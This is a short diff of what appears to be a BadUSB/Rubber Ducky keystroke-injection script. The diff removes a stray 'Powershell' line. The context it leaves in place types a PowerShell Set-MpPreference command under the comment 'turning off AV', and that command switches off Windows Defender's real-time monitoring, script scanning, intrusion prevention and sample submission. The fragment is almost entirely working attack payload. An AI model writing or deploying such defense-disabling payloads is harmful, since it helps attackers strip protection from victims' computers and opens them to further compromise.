@@ -14,9 +14,6 @@ DELAY 400
 ENTER
 DELAY 300
 
-Powershell
-DELAY 300
-
 REM turning off AV
 STRING Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
 ENTER
